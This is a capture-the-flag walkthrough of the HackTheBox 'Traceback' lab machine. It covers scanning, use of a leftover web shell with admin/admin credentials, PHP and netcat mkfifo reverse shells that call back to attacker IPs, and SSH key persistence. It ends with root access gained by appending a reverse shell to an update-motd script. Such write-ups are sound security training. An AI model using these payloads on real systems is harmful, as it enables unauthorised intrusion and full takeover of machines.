---
title: "HackTheBox: Traceback | Walkthrough"
date: 2020-08-16
categories: [hackthebox]
tags: [linux, webshell, sudo, privesc]
---

## Enumeration

Add the host to `/etc/hosts`:

```bash
vi /etc/hosts
10.10.10.181  traceback
````

Run an Nmap scan:

```bash
nmap -A 10.10.10.181 -o traceback/nmap
```

Results:

```
22/tcp   open  ssh   OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp   open  http  Apache httpd 2.4.29
```

Browsing the site reveals a comment suggesting the presence of a **web shell**. Searching leads to:

```
http://traceback/smevk.php
```

Credentials:

```
admin / admin
```

---

## Initial Foothold

On the attacker machine, create a reverse shell:

```bash
vi rev.php
```

```php
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.86/4444 0>&1'");
?>
```

Set up a netcat listener:

```bash
nc -nvlp 4444
```

Upload `rev.php` and then visit:

```
http://traceback/rev.php
```

You should now have a reverse shell.

Stabilize it:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Read the note:

```bash
cd ~
cat note.txt
```

Check sudo privileges:

```bash
sudo -l
```

---

## User Shell

We can execute a command as **sysadmin** to get another reverse shell.

On attacker machine:

```bash
nc -nvlp 1234
```

On target:

```bash
sudo -u sysadmin /home/sysadmin/luvit -e 'os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.114 1234 >/tmp/f")'
```

Now you have a shell as **sysadmin**.

---

## Persistence via SSH

Set up an SSH key:

```bash
(echo "\n\n"; cat ~/.ssh/id_rsa.pub; echo "\n\n") > ~/hackthebox/traceback/www/test.txt
python -m SimpleHTTPServer
```

On target (as webadmin):

```bash
cd ~/.ssh
wget http://10.10.14.114:8000/test.txt
cat test.txt >> authorized_keys
rm test.txt
```

Now you can SSH directly into the machine.

---

## Privilege Escalation

Enumerating processes:

```bash
ps aux | grep root
```

We see that **root is regularly updating `/etc/update-motd.d/`**.

Check permissions:

```bash
ls -al /etc/update-motd.d/
```

We have **write and execute** privileges on `00-header`.

Append a reverse shell payload:

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.114 2345 >/tmp/f" >> /etc/update-motd.d/00-header
```

On attacker machine, open a listener:

```bash
nc -nvlp 2345
```

Then, in another tab:

```bash
ssh webadmin@10.10.10.181
```

When MOTD loads, the payload executes, and you get a reverse shell as **root**.

---

## Proof

```bash
whoami
cat ~/root.txt
```

Rooted ✅

